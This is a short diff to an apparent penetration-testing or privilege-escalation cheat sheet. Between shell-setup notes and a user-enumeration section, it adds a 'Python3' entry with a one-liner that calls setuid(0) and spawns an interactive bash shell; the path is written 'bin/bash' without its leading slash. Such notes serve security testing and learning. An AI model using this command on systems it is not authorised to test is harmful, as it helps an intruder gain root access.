@@ -22,6 +22,10 @@ $ export SHELL=bash
 $ export TERM=xterm-256color
 ```
 
+## Python3
+
+`python3 -c 'import os; os.setuid(0); os.system("bin/bash -i");'`
+
 ## Start with the basics
 
 Who am i and what groups do I belong to?  
